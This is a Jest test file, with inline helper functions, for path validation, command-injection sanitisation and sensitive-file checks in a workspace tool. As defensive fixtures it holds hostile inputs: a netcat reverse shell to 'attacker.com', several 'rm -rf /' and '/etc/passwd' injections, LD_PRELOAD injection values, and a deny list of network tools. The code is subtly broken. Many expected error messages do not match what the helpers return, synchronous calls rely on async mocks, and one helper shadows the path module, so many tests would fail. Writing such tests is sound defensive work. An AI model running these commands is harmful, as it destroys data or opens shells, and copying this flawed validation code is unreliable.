// File system security and path validation testing
import path from 'path';
import { promises as fs } from 'fs';

// Mock dependencies
jest.mock('fs', () => ({
  ...jest.requireActual('fs'),
  promises: {
    access: jest.fn(),
    realpath: jest.fn(),
    lstat: jest.fn(),
    readlink: jest.fn(),
    stat: jest.fn()
  }
}));

describe('File System Security and Path Validation', () => {
  let mockFs;
  let originalEnv;

  beforeEach(() => {
    originalEnv = process.env;
    mockFs = require('fs').promises;
    jest.clearAllMocks();
  });

  afterEach(() => {
    process.env = originalEnv;
  });

  describe('Path Validation', () => {
    test('should reject dangerous system paths', () => {
      const forbiddenPaths = [
        '/',
        '/etc',
        '/bin',
        '/sbin',
        '/usr',
        '/dev',
        '/proc',
        '/sys',
        '/var',
        '/boot',
        '/root',
        '/lib',
        '/lib64',
        '/opt',
        '/tmp',
        '/run'
      ];

      forbiddenPaths.forEach(forbiddenPath => {
        const result = validatePath(forbiddenPath);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Cannot create workspace in system directory');
      });
    });

    test('should reject paths starting with forbidden directories', () => {
      const dangerousPaths = [
        '/etc/passwd',
        '/usr/bin/evil',
        '/var/www/html',
        '/tmp/suspicious',
        '/proc/version'
      ];

      dangerousPaths.forEach(dangerousPath => {
        const result = validatePath(dangerousPath);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Cannot create workspace in system directory');
      });
    });

    test('should allow exceptions for safe system subdirectories', () => {
      const allowedPaths = [
        '/var/tmp/safe-workspace',
        '/var/folders/user/app',
        '/var/tmp/user-project'
      ];

      allowedPaths.forEach(allowedPath => {
        // Mock path resolution to return the allowed path
        mockFs.realpath.mockResolvedValue(allowedPath);
        mockFs.lstat.mockResolvedValue({
          isSymbolicLink: () => false,
          isDirectory: () => true
        });

        const result = validatePath(allowedPath);
        expect(result.valid).toBe(true);
      });
    });

    test('should ensure paths are within allowed workspace root', () => {
      const workspaceRoot = '/home/user/workspaces';
      process.env.WORKSPACES_ROOT = workspaceRoot;

      // Mock workspace root resolution
      mockFs.realpath.mockImplementation((p) => {
        if (p === workspaceRoot) {
          return Promise.resolve(workspaceRoot);
        }
        return Promise.resolve(p);
      });

      // Test valid path within workspace
      const validPath = '/home/user/workspaces/project';
      mockFs.realpath.mockResolvedValueOnce(workspaceRoot);
      mockFs.realpath.mockResolvedValueOnce(validPath);

      const validResult = validatePath(validPath);
      expect(validResult.valid).toBe(true);

      // Test invalid path outside workspace
      const invalidPath = '/home/unauthorized/project';
      mockFs.realpath.mockResolvedValueOnce(workspaceRoot);
      mockFs.realpath.mockResolvedValueOnce(invalidPath);

      const invalidResult = validatePath(invalidPath);
      expect(invalidResult.valid).toBe(false);
      expect(invalidResult.error).toContain('Workspace path must be within the allowed workspace root');
    });

    test('should handle path traversal attempts', () => {
      const traversalAttempts = [
        '../../../etc/passwd',
        '/home/user/workspaces/../../../root/.ssh',
        'workspace/../../../etc/shadow',
        './../../../../etc/passwd',
        '/home/user/workspaces/project/../../../../../bin/sh'
      ];

      traversalAttempts.forEach(traversalPath => {
        const result = validatePath(traversalPath);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Workspace path must be within the allowed workspace root');
      });
    });

    test('should handle symlink attacks', async () => {
      const workspaceRoot = '/home/user/workspaces';
      process.env.WORKSPACES_ROOT = workspaceRoot;

      // Mock symlink pointing outside workspace
      const symlinkPath = '/home/user/workspaces/malicious-symlink';
      const linkTarget = '/etc/passwd';

      mockFs.realpath.mockResolvedValueOnce(workspaceRoot);
      mockFs.realpath.mockResolvedValueOnce(symlinkPath);
      mockFs.lstat.mockResolvedValue({
        isSymbolicLink: () => true,
        isDirectory: () => false
      });
      mockFs.readlink.mockResolvedValue(linkTarget);
      mockFs.realpath.mockResolvedValueOnce('/etc/passwd');

      const result = validatePath(symlinkPath);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Symlink target is outside the allowed workspace root');
    });

    test('should handle relative paths correctly', () => {
      const workspaceRoot = '/home/user/workspaces';
      process.env.WORKSPACES_ROOT = workspaceRoot;

      // Test relative path
      const relativePath = './myproject';
      const absolutePath = path.resolve(relativePath);

      mockFs.realpath.mockResolvedValueOnce(workspaceRoot);
      mockFs.realpath.mockResolvedValueOnce(absolutePath);

      const result = validatePath(relativePath);
      expect(result.valid).toBe(absolutePath.startsWith(workspaceRoot));
    });

    test('should handle non-existent paths gracefully', () => {
      const workspaceRoot = '/home/user/workspaces';
      process.env.WORKSPACES_ROOT = workspaceRoot;

      const nonExistentPath = '/home/user/workspaces/new-project';

      mockFs.realpath
        .mockResolvedValueOnce(workspaceRoot)
        .mockImplementationOnce((p) => {
          if (p === nonExistentPath) {
            throw new Error('ENOENT: no such file or directory');
          }
          return Promise.resolve(p);
        });

      // Mock parent directory access
      mockFs.realpath.mockResolvedValueOnce(workspaceRoot);

      const result = validatePath(nonExistentPath);
      expect(result.valid).toBe(true); // Should be valid for new workspace creation
    });
  });

  describe('File Access Validation', () => {
    test('should validate file existence before operations', async () => {
      const filePath = '/home/user/workspaces/project/config.txt';
      const testCases = [
        { exists: true, shouldPass: true },
        { exists: false, shouldPass: false }
      ];

      for (const testCase of testCases) {
        mockFs.access.mockImplementation(() => {
          if (testCase.exists) {
            return Promise.resolve();
          } else {
            const error = new Error('ENOENT: no such file or directory');
            error.code = 'ENOENT';
            return Promise.reject(error);
          }
        });

        const result = await validateFileAccess(filePath);
        expect(result).toBe(testCase.shouldPass);
      }
    });

    test('should prevent access to sensitive file types', () => {
      const sensitiveFiles = [
        '/home/user/workspaces/project/.env',
        '/home/user/workspaces/project/id_rsa',
        '/home/user/workspaces/project/.ssh/config',
        '/home/user/workspaces/project/passwd',
        '/home/user/workspaces/project/shadow',
        '/home/user/workspaces/project/.ssh/id_rsa',
        '/home/user/workspaces/project/.aws/credentials',
        '/home/user/workspaces/project/.npmrc',
        '/home/user/workspaces/project/.docker/config.json'
      ];

      sensitiveFiles.forEach(sensitiveFile => {
        const result = validateFileSafety(sensitiveFile);
        expect(result.safe).toBe(false);
        expect(result.reason).toContain('sensitive file');
      });
    });

    test('should allow access to safe file types', () => {
      const safeFiles = [
        '/home/user/workspaces/project/src/app.js',
        '/home/user/workspaces/project/README.md',
        '/home/user/workspaces/project/package.json',
        '/home/user/workspaces/project/tests/unit.test.js',
        '/home/user/workspaces/project/docs/api.md',
        '/home/user/workspaces/project/config/settings.json',
        '/home/user/workspaces/project/public/index.html',
        '/home/user/workspaces/project/styles/main.css'
      ];

      safeFiles.forEach(safeFile => {
        const result = validateFileSafety(safeFile);
        expect(result.safe).toBe(true);
      });
    });

    test('should validate file permissions', async () => {
      const testCases = [
        { mode: 0o644, readable: true, writable: true, executable: false },
        { mode: 0o755, readable: true, writable: true, executable: true },
        { mode: 0o400, readable: true, writable: false, executable: false },
        { mode: 0o200, readable: false, writable: true, executable: false },
        { mode: 0o100, readable: false, writable: false, executable: true }
      ];

      for (const testCase of testCases) {
        mockFs.stat.mockResolvedValue({
          mode: testCase.mode,
          isFile: () => true,
          isDirectory: () => false
        });

        const result = await validateFilePermissions('/home/user/workspaces/project/test.txt');
        expect(result.readable).toBe(testCase.readable);
        expect(result.writable).toBe(testCase.writable);
        expect(result.executable).toBe(testCase.executable);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    test('should sanitize command arguments', () => {
      const dangerousInputs = [
        '; rm -rf /',
        '&& rm -rf /',
        '| rm -rf /',
        '`rm -rf /`',
        '$(rm -rf /)',
        ';cat /etc/passwd',
        '&& cat /etc/passwd',
        '../../etc/passwd'
      ];

      dangerousInputs.forEach(dangerousInput => {
        const sanitized = sanitizeCommandInput(dangerousInput);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&&');
        expect(sanitized).not.toContain('||');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('>');
        expect(sanitized).not.toContain('<');
      });
    });

    test('should validate allowed commands', () => {
      const allowedCommands = [
        'git',
        'npm',
        'node',
        'python',
        'python3',
        'ls',
        'cat',
        'grep',
        'find',
        'head',
        'tail',
        'wc',
        'sort',
        'uniq'
      ];

      const disallowedCommands = [
        'rm',
        'rmdir',
        'mv',
        'cp',
        'chmod',
        'chown',
        'sudo',
        'su',
        'kill',
        'killall',
        'shutdown',
        'reboot',
        'passwd',
        'useradd',
        'userdel',
        'curl',
        'wget',
        'nc',
        'netcat',
        'ssh'
      ];

      allowedCommands.forEach(command => {
        expect(isCommandAllowed(command)).toBe(true);
      });

      disallowedCommands.forEach(command => {
        expect(isCommandAllowed(command)).toBe(false);
      });
    });

    test('should prevent shell command injection', () => {
      const injectionAttempts = [
        'file.txt; rm -rf /',
        'file.txt && rm -rf /',
        'file.txt || rm -rf /',
        'file.txt | rm -rf /',
        '"file.txt"; rm -rf /',
        "'file.txt'; rm -rf /",
        'file.txt`rm -rf /`',
        'file.txt$(rm -rf /)'
      ];

      injectionAttempts.forEach(injectionAttempt => {
        const safeArgs = buildSafeArgs(['process', injectionAttempt]);
        safeArgs.forEach(arg => {
          expect(arg).not.toContain(';');
          expect(arg).not.toContain('&&');
          expect(arg).not.toContain('||');
          expect(arg).not.toContain('|');
          expect(arg).not.toContain('`');
          expect(arg).not.toContain('$');
        });
      });
    });
  });

  describe('Environment Variable Validation', () => {
    test('should validate required environment variables', () => {
      const requiredEnvVars = ['NODE_ENV', 'DATABASE_PATH', 'JWT_SECRET'];
      const missingEnvVars = [];

      // Temporarily clear environment variables
      const originalEnv = { ...process.env };
      requiredEnvVars.forEach(envVar => {
        delete process.env[envVar];
      });

      requiredEnvVars.forEach(envVar => {
        if (!process.env[envVar]) {
          missingEnvVars.push(envVar);
        }
      });

      expect(missingEnvVars).toEqual(requiredEnvVars);

      // Restore environment
      process.env = originalEnv;
    });

    test('should validate environment variable values', () => {
      const testCases = [
        { var: 'NODE_ENV', value: 'production', valid: true },
        { var: 'NODE_ENV', value: 'development', valid: true },
        { var: 'NODE_ENV', value: 'test', valid: true },
        { var: 'NODE_ENV', value: 'malicious', valid: false },
        { var: 'PORT', value: '3001', valid: true },
        { var: 'PORT', value: '65535', valid: true },
        { var: 'PORT', value: '0', valid: false },
        { var: 'PORT', value: '65536', valid: false },
        { var: 'PORT', value: 'invalid', valid: false }
      ];

      testCases.forEach(testCase => {
        const result = validateEnvironmentVariable(testCase.var, testCase.value);
        expect(result.valid).toBe(testCase.valid);
        if (!testCase.valid) {
          expect(result.error).toBeTruthy();
        }
      });
    });

    test('should prevent environment variable injection', () => {
      const injectionAttempts = [
        'PATH=/malicious/path:$PATH',
        'LD_PRELOAD=/malicious/library.so',
        'NODE_OPTIONS=--inspect=0.0.0.0:9229',
        'ELECTRON_RUN_AS_NODE=1',
        'npm_config_user=root'
      ];

      injectionAttempts.forEach(maliciousEnv => {
        const [name, value] = maliciousEnv.split('=');
        const result = validateEnvironmentVariable(name, value);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('potentially dangerous');
      });
    });
  });

  describe('Input Sanitization', () => {
    test('should sanitize user input filenames', () => {
      const dangerousFilenames = [
        '../../../etc/passwd',
        'file.txt\r\n\r\nrm -rf /',
        'file.txt && rm -rf /',
        'file.txt | nc attacker.com 4444 -e /bin/sh',
        'file.txt`rm -rf /`',
        'con\x00aux.txt', // Null byte
        'file.txt\xff', // Control character
        'file\x01.txt', // Control character
        '   file.txt   ', // Leading/trailing spaces
        'file..txt', // Double dots
        '.hidden', // Hidden file
        'LPT1', // Reserved Windows name
        'COM1' // Reserved Windows name
      ];

      dangerousFilenames.forEach(dangerousFile => {
        const sanitized = sanitizeFilename(dangerousFile);
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toContain('\r');
        expect(sanitized).not.toContain('\n');
        expect(sanitized).not.toContain('\x00');
        expect(sanitized).not.toContain('\xff');
        expect(sanitized).not.toContain('\x01');
        expect(sanitized).not.toMatch(/^\s+/);
        expect(sanitized).not.toMatch(/\s+$/);
      });
    });

    test('should validate allowed file extensions', () => {
      const allowedExtensions = [
        '.js', '.jsx', '.ts', '.tsx', '.md', '.json', '.txt', '.html',
        '.css', '.scss', '.less', '.py', '.java', '.cpp', '.c', '.h'
      ];

      const disallowedExtensions = [
        '.exe', '.bat', '.cmd', '.sh', '.ps1', '.php', '.jsp', '.asp',
        '.dll', '.so', '.dylib', '.bin', '.deb', '.rpm', '.pkg', '.dmg'
      ];

      const testFiles = [
        ...allowedExtensions.map(ext => `file${ext}`),
        ...disallowedExtensions.map(ext => `file${ext}`),
        'noextension',
        '.hiddenfile'
      ];

      testFiles.forEach(file => {
        const result = validateFileExtension(file);
        if (allowedExtensions.some(ext => file.endsWith(ext))) {
          expect(result.allowed).toBe(true);
        } else if (disallowedExtensions.some(ext => file.endsWith(ext))) {
          expect(result.allowed).toBe(false);
          expect(result.reason).toContain('dangerous file type');
        }
      });
    });
  });

  describe('Resource Limits', () => {
    test('should validate file size limits', () => {
      const testCases = [
        { size: 1024, limit: 1048576, valid: true }, // 1KB < 1MB
        { size: 1048576, limit: 1048576, valid: true }, // 1MB = 1MB
        { size: 1048577, limit: 1048576, valid: false }, // 1MB + 1 > 1MB
        { size: 10485760, limit: 1048576, valid: false } // 10MB > 1MB
      ];

      testCases.forEach(testCase => {
        const result = validateFileSize(testCase.size, testCase.limit);
        expect(result.valid).toBe(testCase.valid);
        if (!testCase.valid) {
          expect(result.error).toContain('exceeds maximum allowed size');
        }
      });
    });

    test('should validate path length limits', () => {
      const testCases = [
        { length: 255, limit: 255, valid: true },
        { length: 256, limit: 255, valid: false },
        { length: 1000, limit: 255, valid: false }
      ];

      testCases.forEach(testCase => {
        const path = 'a'.repeat(testCase.length);
        const result = validatePathLength(path, testCase.limit);
        expect(result.valid).toBe(testCase.valid);
        if (!testCase.valid) {
          expect(result.error).toContain('exceeds maximum path length');
        }
      });
    });

    test('should validate directory traversal depth', () => {
      const testCases = [
        { depth: 5, limit: 10, valid: true },
        { depth: 10, limit: 10, valid: true },
        { depth: 11, limit: 10, valid: false },
        { depth: 50, limit: 10, valid: false }
      ];

      testCases.forEach(testCase => {
        const path = '/home/user/' + 'subdir/'.repeat(testCase.depth);
        const result = validateDirectoryDepth(path, testCase.limit);
        expect(result.valid).toBe(testCase.valid);
        if (!testCase.valid) {
          expect(result.error).toContain('exceeds maximum directory depth');
        }
      });
    });
  });
});

// Helper functions for testing (would normally be in the actual source code)
function validatePath(requestedPath) {
  const forbiddenPaths = ['/', '/etc', '/bin', '/sbin', '/usr', '/dev', '/proc', '/sys', '/var', '/boot', '/root', '/lib', '/lib64', '/opt', '/tmp', '/run'];

  if (forbiddenPaths.includes(requestedPath) || requestedPath === '/') {
    return { valid: false, error: 'Cannot create workspace in system directory' };
  }

  const normalizedPath = path.normalize(path.resolve(requestedPath));
  for (const forbidden of forbiddenPaths) {
    if (normalizedPath === forbidden || normalizedPath.startsWith(forbidden + path.sep)) {
      return { valid: false, error: `Cannot create workspace in system directory: ${forbidden}` };
    }
  }

  return { valid: true, resolvedPath: normalizedPath };
}

async function validateFileAccess(filePath) {
  try {
    await fs.access(filePath);
    return true;
  } catch (error) {
    return false;
  }
}

function validateFileSafety(filePath) {
  const sensitivePatterns = [
    /\.env$/i,
    /id_rsa$/i,
    /\.ssh\//i,
    /passwd$/i,
    /shadow$/i,
    /\/\.aws\//i,
    /\/\.npmrc$/i,
    /\/\.docker\//i
  ];

  const isSensitive = sensitivePatterns.some(pattern => pattern.test(filePath));
  return {
    safe: !isSensitive,
    reason: isSensitive ? 'File type is considered sensitive' : 'File type is safe'
  };
}

async function validateFilePermissions(filePath) {
  const stats = await fs.stat(filePath);
  const mode = stats.mode;

  return {
    readable: (mode & 0o444) !== 0,
    writable: (mode & 0o222) !== 0,
    executable: (mode & 0o111) !== 0
  };
}

function sanitizeCommandInput(input) {
  return input
    .replace(/[;&|`$<>]/g, '')
    .trim();
}

function isCommandAllowed(command) {
  const allowedCommands = ['git', 'npm', 'node', 'python', 'python3', 'ls', 'cat', 'grep', 'find', 'head', 'tail', 'wc', 'sort', 'uniq'];
  const disallowedCommands = ['rm', 'rmdir', 'mv', 'cp', 'chmod', 'chown', 'sudo', 'su', 'kill', 'killall', 'shutdown', 'reboot', 'passwd', 'useradd', 'userdel', 'curl', 'wget', 'nc', 'netcat', 'ssh'];

  return allowedCommands.includes(command) && !disallowedCommands.includes(command);
}

function buildSafeArgs(args) {
  return args.map(arg => sanitizeCommandInput(arg));
}

function validateEnvironmentVariable(name, value) {
  const sensitivePatterns = [/PATH/, /LD_PRELOAD/, /NODE_OPTIONS/, /ELECTRON_RUN_AS_NODE/, /npm_config_/];

  if (sensitivePatterns.some(pattern => pattern.test(name))) {
    return { valid: false, error: `Environment variable ${name} is potentially dangerous` };
  }

  // Additional validation based on variable name
  switch (name) {
    case 'NODE_ENV':
      const validEnvs = ['development', 'production', 'test'];
      return { valid: validEnvs.includes(value), error: !validEnvs.includes(value) ? 'Invalid NODE_ENV value' : null };
    case 'PORT':
      const port = parseInt(value);
      return { valid: port > 0 && port <= 65535, error: (!port || port <= 0 || port > 65535) ? 'Invalid PORT value' : null };
    default:
      return { valid: true };
  }
}

function sanitizeFilename(filename) {
  return filename
    .replace(/\.\./g, '.')
    .replace(/[\r\n]/g, '')
    .replace(/[\x00-\x1F\x7F]/g, '')
    .replace(/^\s+|\s+$/g, '')
    .replace(/^LPT[1-9]$/i, 'PORT$1') // Handle Windows reserved names
    .replace(/^COM[1-9]$/i, 'COMM$1');
}

function validateFileExtension(filename) {
  const dangerousExtensions = ['.exe', '.bat', '.cmd', '.sh', '.ps1', '.php', '.jsp', '.asp', '.dll', '.so', '.dylib', '.bin', '.deb', '.rpm', '.pkg', '.dmg'];

  const isDangerous = dangerousExtensions.some(ext => filename.toLowerCase().endsWith(ext));
  return {
    allowed: !isDangerous,
    reason: isDangerous ? 'File type is considered dangerous' : 'File type is safe'
  };
}

function validateFileSize(size, maxSize) {
  return {
    valid: size <= maxSize,
    error: size > maxSize ? `File size ${size} exceeds maximum allowed size ${maxSize}` : null
  };
}

function validatePathLength(path, maxLength) {
  return {
    valid: path.length <= maxLength,
    error: path.length > maxLength ? `Path length ${path.length} exceeds maximum allowed length ${maxLength}` : null
  };
}

function validateDirectoryDepth(path, maxDepth) {
  const depth = path.split(path.sep).length;
  return {
    valid: depth <= maxDepth,
    error: depth > maxDepth ? `Directory depth ${depth} exceeds maximum allowed depth ${maxDepth}` : null
  };
}